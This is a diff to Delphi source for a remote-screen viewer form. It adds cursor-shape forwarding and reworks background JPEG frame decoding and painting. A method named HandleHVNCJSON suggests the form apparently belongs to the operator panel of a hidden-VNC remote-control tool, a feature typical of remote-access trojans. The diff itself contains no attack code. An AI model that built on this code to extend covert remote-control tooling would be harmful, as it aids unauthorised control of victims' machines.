@@ -51,6 +51,7 @@ type
 
     FLock        : TCriticalSection;
     FPendingBytes: TBytes;
+    FPendingCursor: Integer;
     FHasFrame    : Boolean;
     FIsDecoding  : Boolean;
 
@@ -84,7 +85,7 @@ type
       ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
     procedure DetachCallbacks;
     procedure HandleHVNCJSON(JSONObj: TJSONObject);
-    procedure QueueFrameBytes(const Bytes: TBytes);
+    procedure QueueFrameBytes(const Bytes: TBytes; CursorShape: Integer);
   end;
 
 var
@@ -269,14 +270,15 @@ end;
 {  QueueFrameBytes  (network thread -> background decode -> UI thread)     }
 { ---------------------------------------------------------------------- }
 
-procedure TForm10.QueueFrameBytes(const Bytes: TBytes);
+procedure TForm10.QueueFrameBytes(const Bytes: TBytes; CursorShape: Integer);
 begin
   if (csDestroying in ComponentState) then Exit;
 
   FLock.Enter;
   try
-    FPendingBytes := Copy(Bytes);
-    FHasFrame     := True;
+    FPendingBytes  := Copy(Bytes);
+    FPendingCursor := CursorShape;
+    FHasFrame      := True;
     if FIsDecoding then Exit;
     FIsDecoding := True;
   finally
@@ -287,59 +289,98 @@ begin
     procedure
     var
       LocalBytes : TBytes;
+      LocalCursor: Integer;
       MS         : TMemoryStream;
       JPG        : TJPEGImage;
       TempBmp    : TBitmap;
-    begin
-      while True do
+
+      procedure InternalUpdate(ABmp: TBitmap; ACur: Integer);
       begin
+        TThread.Queue(nil,
+          procedure
+          begin
+            try
+              if (csDestroying in ComponentState) then Exit;
+              FBitmapLock.Enter;
+              try
+                FBitmap.Assign(ABmp);
+              finally
+                FBitmapLock.Leave;
+              end;
+              PaintBox1.Invalidate;
+
+              case ACur of
+                1: Screen.Cursor := crArrow;
+                2: Screen.Cursor := crIBeam;
+                3: Screen.Cursor := crHourGlass;
+                4: Screen.Cursor := crCross;
+                5: Screen.Cursor := crUpArrow;
+                8: Screen.Cursor := crSizeNWSE;
+                9: Screen.Cursor := crSizeNESW;
+                10: Screen.Cursor := crSizeWE;
+                11: Screen.Cursor := crSizeNS;
+                12: Screen.Cursor := crSizeAll;
+                13: Screen.Cursor := crNo;
+                14: Screen.Cursor := crHandPoint;
+                15: Screen.Cursor := crAppStart;
+                16: Screen.Cursor := crHelp;
+              else
+                Screen.Cursor := crDefault;
+              end;
+            finally
+              ABmp.Free;
+            end;
+          end);
+      end;
+
+    begin
+      try
+        while not (csDestroying in ComponentState) do
+        begin
+          FLock.Enter;
+          try
+            if not FHasFrame then
+            begin
+              FIsDecoding := False;
+              Exit;
+            end;
+            LocalBytes     := FPendingBytes;
+            LocalCursor    := FPendingCursor;
+            FPendingBytes  := nil;
+            FHasFrame      := False;
+          finally
+            FLock.Leave;
+          end;
+
+          if Length(LocalBytes) = 0 then Continue;
+
+          MS  := TMemoryStream.Create;
+          JPG := TJPEGImage.Create;
+          try
+            MS.WriteBuffer(LocalBytes[0], Length(LocalBytes));
+            MS.Position := 0;
+            try
+              JPG.LoadFromStream(MS);
+              TempBmp := TBitmap.Create;
+              try
+                TempBmp.Assign(JPG);
+                InternalUpdate(TempBmp, LocalCursor);
+              except
+                TempBmp.Free;
+              end;
+            except
+            end;
+          finally
+            JPG.Free;
+            MS.Free;
+          end;
+        end;
+      finally
         FLock.Enter;
         try
-          if not FHasFrame then
-          begin
-            FIsDecoding := False;
-            Exit;
-          end;
-          LocalBytes    := FPendingBytes;
-          FPendingBytes := nil;
-          FHasFrame     := False;
+          FIsDecoding := False;
         finally
           FLock.Leave;
-        end;
-
-        if Length(LocalBytes) = 0 then Continue;
-
-        TempBmp := TBitmap.Create;
-        MS      := TMemoryStream.Create;
-        JPG     := TJPEGImage.Create;
-        try
-          MS.WriteBuffer(LocalBytes[0], Length(LocalBytes));
-          MS.Position := 0;
-          try
-            JPG.LoadFromStream(MS);
-            TempBmp.Assign(JPG);
-
-            TThread.Synchronize(nil,
-              procedure
-              begin
-                if (csDestroying in ComponentState) then Exit;
-
-                FBitmapLock.Enter;
-                try
-                  FBitmap.Assign(TempBmp);
-                  FLastWidth  := FBitmap.Width;
-                  FLastHeight := FBitmap.Height;
-                finally
-                  FBitmapLock.Leave;
-                end;
-                PaintBox1.Invalidate;
-              end);
-          except
-          end;
-        finally
-          JPG.Free;
-          MS.Free;
-          TempBmp.Free;
         end;
       end;
     end).Start;
